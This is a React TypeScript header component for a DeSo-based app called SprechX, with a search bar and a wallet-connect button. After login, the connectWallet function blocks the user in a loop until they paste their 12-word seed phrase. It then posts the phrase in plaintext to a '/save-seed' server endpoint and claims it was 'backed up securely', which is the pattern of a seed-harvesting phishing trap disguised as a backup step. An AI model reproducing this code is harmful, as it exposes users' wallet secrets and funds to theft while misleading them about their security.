import React, { useState } from 'react';
import './Header.css';
import { FaSearch } from 'react-icons/fa';
import * as Deso from 'deso-protocol';
import { identity } from 'deso-protocol';

const Header: React.FC = () => {
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');

  // Handle wallet connection
  const connectWallet = async () => {
    try {
      identity.configure({
        network: 'testnet',
        nodeURI: 'https://test.deso.org',
        appName: 'SprechX',
      });

      const response = await identity.login(); // Call login directly on Deso
      console.log('Login response:', response); // Log the response to inspect structure
      
      if (response && response.publicKeyBase58Check) {
        const address = response.publicKeyBase58Check;

        let seedBackedUp = false;
        while (!seedBackedUp) {
          alert(
            "🔐 Backup Required\n\nTo continue using SprechX, you need to back up your seed phrase."
          );
          const seed = prompt("Paste your 12-word seed phrase here to confirm backup:");
        
          if (!seed || seed.split(" ").length < 12) {
            alert("⚠️ Invalid seed phrase. Please enter a valid 12-word phrase.");
          } else {
            const res = await fetch("http://localhost:5000/save-seed", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ seedPhrase: seed }),
            });
          
            const result = await res.json();
            if (res.ok) {
              alert("✅ Seed phrase backed up securely.");
              seedBackedUp = true;
            } else {
              alert("❌ Failed to save seed: " + result.error);
            }
          }
        }

        setWalletConnected(true);
        setWalletAddress(address);
        console.log('%c✅ Wallet connected:', 'color: green', address);;
      } else {
        console.error('Unexpected login response format:', response);
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
    }
  };

  // Handle wallet disconnection
  const disconnectWallet = async () => {
    try {
      await Deso.identity.logout(); // Call logout directly on Deso
      setWalletConnected(false);
      setWalletAddress(null);
      console.log('Wallet disconnected');
    } catch (error) {
      console.error('Error disconnecting wallet:', error);
    }
  };

  // Handle search
  const handleSearch = () => {
    console.log('Search term:', searchTerm);
  };

  return (
    <header className="header">
      <div className="header-left">
        <a href="/" className="header-link">
          <img src="/assets/logo.png" className="header-logo" alt="SprechX Logo" />
          <span className="header-title">SprechX</span>
        </a>
      </div>
      <div className="header-wallet">
        <div className="search-bar">
          <input
            type="text"
            placeholder="Search SprechX"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
          <button className="search-button" onClick={handleSearch}>
            <FaSearch />
          </button>
        </div>
        <button className="wallet-button" onClick={walletConnected ? disconnectWallet : connectWallet}>
          {walletConnected ? (
            <span className="wallet-address">
              {walletAddress?.substring(0, 6)}...{walletAddress?.substring(walletAddress.length - 4)}
            </span>
          ) : (
            'Connect Wallet'
          )}
        </button>
      </div>
    </header>
  );
};

export default Header;
